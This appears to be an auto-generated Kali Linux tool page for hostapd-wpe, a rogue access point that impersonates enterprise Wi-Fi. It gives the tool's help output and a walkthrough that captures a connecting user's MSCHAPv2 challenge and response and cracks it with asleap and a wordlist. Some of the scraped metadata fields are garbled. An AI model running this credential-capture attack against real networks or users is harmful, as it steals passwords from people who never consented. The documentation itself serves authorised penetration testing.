---
tool_id: hostapd-wpe
title: hostapd-wpe
categories: ["wireless-attacks"]
category_slugs: ["wireless-attacks"]
homepage: https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe
repository: 
version: 2.10+git20220310-0kali3
architectures: any
license: 
binaries: []
metapackages: ["kali-linux-everything kali-tools-802-11 kali-tools-wireless"]
icon: /images/kali-tools-icon-missing.svg
source_path: kali-tools\hostapd-wpe\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:06.935262
---

# Tool: hostapd-wpe (hostapd-wpe)

## Categories
- [wireless-attacks](../wireless-attacks.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe](https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe) |
| Repository |  |
| Version | 2.10+git20220310-0kali3 |
| Architectures | any |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-everything kali-tools-802-11 kali-tools-wireless |
| Icon | /images/kali-tools-icon-missing.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **Repository**: https://gitlab.com/kalilinux/packages/hostapd-wpe
- **PackagesInfo**: |
- **hostapd-wpe supports the following EAP types for impersonation**: []
- **http**: //www.foofus.net/?page_id=115
- **vulnerable clients. Inspiration for this was provided by the Cupid PoC**: []
- **https**: //github.com/lgrangeia/cupid
- ****Installed size**: ** `2.25 MB`
- ****How to install**: ** `sudo apt install hostapd-wpe`
- **{{< spoiler "Dependencies**: " >}}
- **root@kali**: ~# hostapd-wpe --help
- **hostapd-wpe**: invalid option -- '-'


## Documentation (Upstream)
--------------------------------------------------
 WPE (Wireless Pwnage Edition)
 This version has been cleverly modified to target
 wired and wireless users.
 Twitter: @aircrackng
 Website: https://aircrack-ng.org
 
 usage: hostapd-wpe [-hdBKtvrkc] [-P <PID file>] [-e <entropy file>] \
          [-g <global ctrl_iface>] [-G <group>]\
          [-i <comma-separated list of interface names>]\
          <configuration file(s)>
 
 options:
    -h   show this usage
    -d   show more debug messages (-dd for even more)
    -B   run daemon in the background
    -e   entropy file
    -g   global control interface path
    -G   group for control interfaces
    -P   PID file
    -K   include key data in debug messages
    -f   log output to debug file instead of stdout
    -T   record to Linux tracing in addition to logging
         (records all messages regardless of debug verbosity)
    -i   list of interface names to use
    -s   log output to syslog instead of stdout
    -S   start all the interfaces synchronously
    -t   include timestamps in some debug messages
    -v   show hostapd version
 
 
 WPE options:
    -r   Return Success where possible
    -c   Cupid Mode (Heartbleed clients)
 
    -k   Karma Mode (Respond to all probes)
 
    Note: credentials logging is always enabled
 
 ```
 
 - - -
 
 ##### hostapd-wpe_cli
 
 
 ```
 root@kali:~# hostapd-wpe_cli -h
 hostapd_cli v2.10
 Copyright (c) 2004-2022, Jouni Malinen <j@w1.fi> and contributors
 
 usage: hostapd_cli [-p<path>] [-i<ifname>] [-hvBr] [-a<path>] \
                    [-P<pid file>] [-G<ping interval>] [command..]
 
 Options:
    -h           help (show this usage text)
    -v           shown version information
    -p<path>     path to find control sockets (default: /var/run/hostapd-wpe)
    -s<dir_path> dir path to open client sockets (default: /var/run/hostapd-wpe)
    -a<file>     run in daemon mode executing the action file based on events
                 from hostapd
    -r           try to reconnect when client socket is disconnected.
                 This is useful only when used with -a.
    -B           run a daemon in the background
    -i<ifname>   Interface to listen on (default: first interface found in the
                 socket path)
 
 commands:
   ping = pings hostapd
   mib = get MIB variables (dot1x, dot11, radius)
   relog = reload/truncate debug log output file
   status = show interface status info
   sta <addr> = get MIB variables for one station
   all_sta = get MIB variables for all stations
   list_sta = list all stations
   new_sta <addr> = add a new station
   deauthenticate <addr> = deauthenticate a station
   disassociate <addr> = disassociate a station
   signature <addr> = get taxonomy signature for a station
   sa_query <addr> = send SA Query to a station
   wps_pin <uuid> <pin> [timeout] [addr] = add WPS Enrollee PIN
   wps_check_pin <PIN> = verify PIN checksum
   wps_pbc = indicate button pushed to initiate PBC
   wps_cancel = cancel the pending WPS operation
   wps_nfc_tag_read <hexdump> = report read NFC tag with WPS data
   wps_nfc_config_token <WPS/NDEF> = build NFC configuration token
   wps_nfc_token <WPS/NDEF/enable/disable> = manager NFC password token
   wps_ap_pin <cmd> [params..] = enable/disable AP PIN
   wps_config <SSID> <auth> <encr> <key> = configure AP
   wps_get_status = show current WPS status
   disassoc_imminent = send Disassociation Imminent notification
   ess_disassoc = send ESS Dissassociation Imminent notification
   bss_tm_req = send BSS Transition Management Request
   get_config = show current configuration
   help = show this usage help
   interface [ifname] = show interfaces/select interface
   fst <params...> = send FST-MANAGER control interface command
   raw <params..> = send unprocessed command
   level <debug level> = change debug level
   license = show full hostapd_cli license
   quit = exit hostapd_cli
   set <name> <value> = set runtime variables
   get <name> = get runtime info
   set_qos_map_set <arg,arg,...> = set QoS Map set element
   send_qos_map_conf <addr> = send QoS Map Configure frame
   chan_switch <cs_count> <freq> [sec_channel_offset=] [center_freq1=]
     [center_freq2=] [bandwidth=] [blocktx] [ht|vht]
     = initiate channel switch announcement
   hs20_wnm_notif <addr> <url>
     = send WNM-Notification Subscription Remediation Request
   hs20_deauth_req <addr> <code (0/1)> <Re-auth-Delay(sec)> [url]
     = send WNM-Notification imminent deauthentication indication
   vendor <vendor id> <sub command id> [<hex formatted data>]
     = send vendor driver command
   enable = enable hostapd on current interface
   reload = reload configuration for current interface
   disable = disable hostapd on current interface
   update_beacon = update Beacon frame contents
   
   erp_flush = drop all ERP keys
   log_level [level] = show/change log verbosity level
   pmksa  = show PMKSA cache entries
   pmksa_flush  = flush PMKSA cache
   set_neighbor <addr> <ssid=> <nr=> [lci=] [civic=] [stat]
     = add AP to neighbor database
   show_neighbor   = show neighbor database entries
   remove_neighbor <addr> [ssid=<hex>] = remove AP from neighbor database
   req_lci <addr> = send LCI request to a station
   req_range  = send FTM range request
   driver_flags  = show supported driver flags
   dpp_qr_code report a scanned DPP URI from a QR Code
   dpp_bootstrap_gen type=<qrcode> [chan=..] [mac=..] [info=..] [curve=..] [key=..] = generate DPP bootstrap information
   dpp_bootstrap_remove *|<id> = remove DPP bootstrap information
   dpp_bootstrap_get_uri <id> = get DPP bootstrap URI
   dpp_bootstrap_info <id> = show DPP bootstrap information
   dpp_bootstrap_set <id> [conf=..] [ssid=<SSID>] [ssid_charset=#] [psk=<PSK>] [pass=<passphrase>] [configurator=<id>] [conn_status=#] [akm_use_selector=<0|1>] [group_id=..] [expiry=#] [csrattrs=..] = set DPP configurator parameters
   dpp_auth_init peer=<id> [own=<id>] = initiate DPP bootstrapping
   dpp_listen <freq in MHz> = start DPP listen
   dpp_stop_listen = stop DPP listen
   dpp_configurator_add [curve=..] [key=..] = add DPP configurator
   dpp_configurator_remove *|<id> = remove DPP configurator
   dpp_configurator_get_key <id> = Get DPP configurator's private key
   dpp_configurator_sign conf=<role> configurator=<id> = generate self DPP configuration
   dpp_pkex_add add PKEX code
   dpp_pkex_remove *|<id> = remove DPP pkex information
   dpp_controller_start [tcp_port=<port>] [role=..] = start DPP controller
   dpp_controller_stop = stop DPP controller
   dpp_chirp own=<BI ID> iter=<count> = start DPP chirp
   dpp_stop_chirp = stop DPP chirp
   accept_acl =Add/Delete/Show/Clear accept MAC ACL
   deny_acl =Add/Delete/Show/Clear deny MAC ACL
   poll_sta <addr> = poll a STA to check connectivity with a QoS null frame
   req_beacon <addr> [req_mode=] <measurement request hexdump>  = send a Beacon report request to a station
   reload_wpa_psk = reload wpa_psk_file only
 ```
 
 - - -
 
---
{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## hostapd-wpe Usage Example

Update your Kali installation, install hostapd-wpe if not already present:

```console
root@kali:~# apt update
root@kali:~# apt install hostapd-wpe
```

Once installed, configure AP properties by editing `/etc/hostapd-wpe/hostapd-wpe.conf`:

```console
root@kali:~# nano /etc/hostapd-wpe/hostapd-wpe.conf
```

Kill network-manager using airmon-ng

```console
root@kali:~# airmon-ng check kill
```

Start hostapd-wpe. A wireless AP will appear. Passwords of users connecting and authenticating to this network will be printed to the console.

```console
root@kali:~# hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
Configuration file: /etc/hostapd-wpe/hostapd-wpe.conf
Using interface wlan0 with hwaddr c4:e9:84:17:ff:c8 and ssid "hostapd-wpe"
wlan0: interface state UNINITIALIZED>ENABLED
wlan0: AP-ENABLED
wlan0: STA ac:fd:ec:78:72:bd IEEE 802.11: authenticated
wlan0: STA ac:fd:ec:78:72:bd IEEE 802.11: associated (aid 1)
wlan0: CTRL-EVENT-EAP-STARTED ac:fd:ec:78:72:bd
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25

mschapv2: Sat Nov 12 16:04:03 2016
username: me
challenge: 8e:0e:9d:0b:5a:3f:f5:23
response: 34:f8:42:4d:16:c7:2d:69:cc:38:10:d4:cf:71:f7:83:37:68:d8:8a:e9:86:f2:67
jtr NETNTLM: me:$NETNTLM$8e0e9d0b5a3ff523$34f8424d16c72d69cc3810d4cf71f7833768d88ae986f267

wlan0: CTRL-EVENT-EAP-FAILURE ac:fd:ec:78:72:bd
wlan0: STA ac:fd:ec:78:72:bd IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan0: STA ac:fd:ec:78:72:bd IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan0: STA ac:fd:ec:78:72:bd IEEE 802.11: disassociated
wlan0: STA ac:fd:ec:78:72:bd IEEE 802.11: deauthenticated due to local deauth request
wlan0: AP-DISABLED
nl80211: deinit ifname=wlan0 disabled_11b_rates=0
root@kali:~#
```

Once a challenge and responce are obtained, crack them using asleap, together with a password dictionary file.

```console
root@kali:~# zcat /usr/share/wordlists/rockyou.txt.gz | asleap -C 8e:0e:9d:0b:5a:3f:f5:23 -R 34:f8:42:4d:16:c7:2d:69:cc:38:10:d4:cf:71:f7:83:37:68:d8:8a:e9:86:f2:67 -W -
asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
Using STDIN for words.
hash bytes: 586c
NT hash: 8846f7eaee8fb117ad06bdd830b7586c
password: password
```


## Source
- Path: kali-tools\hostapd-wpe\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:06.935262
